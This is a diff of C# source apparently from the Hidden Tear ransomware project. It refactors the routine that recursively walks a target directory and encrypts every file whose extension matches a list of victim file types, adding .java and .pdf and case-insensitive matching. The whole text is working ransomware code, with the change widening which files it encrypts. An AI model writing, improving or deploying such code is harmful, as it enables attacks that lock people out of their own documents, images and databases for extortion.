@@ -146,27 +146,16 @@ namespace hidden_tear
         //encrypts target directory
         public void encryptDirectory(string location, string password)
         {
-            
             //extensions to be encrypt
-            var validExtensions = new[]
-            {
-                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
-            };
-
-            string[] files = Directory.GetFiles(location);
-            string[] childDirectories = Directory.GetDirectories(location);
-            for (int i = 0; i < files.Length; i++){
-                string extension = Path.GetExtension(files[i]);
-                if (validExtensions.Contains(extension))
-                {
-                    EncryptFile(files[i],password);
+            var validExtensions = new[] {".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".java", ".pdf"};
+            foreach(string file in Directory.GetFiles(location)) {
+                if (validExtensions.Contains(Path.GetExtension(file).ToLower())) {
+                    EncryptFile(file, password);
                 }
             }
-            for (int i = 0; i < childDirectories.Length; i++){
-                encryptDirectory(childDirectories[i],password);
-            }
-            
-            
+            foreach(string child in Directory.GetDirectories(location)) {
+                encryptDirectory(child, password);
+            }  
         }
 
         public void startAction()
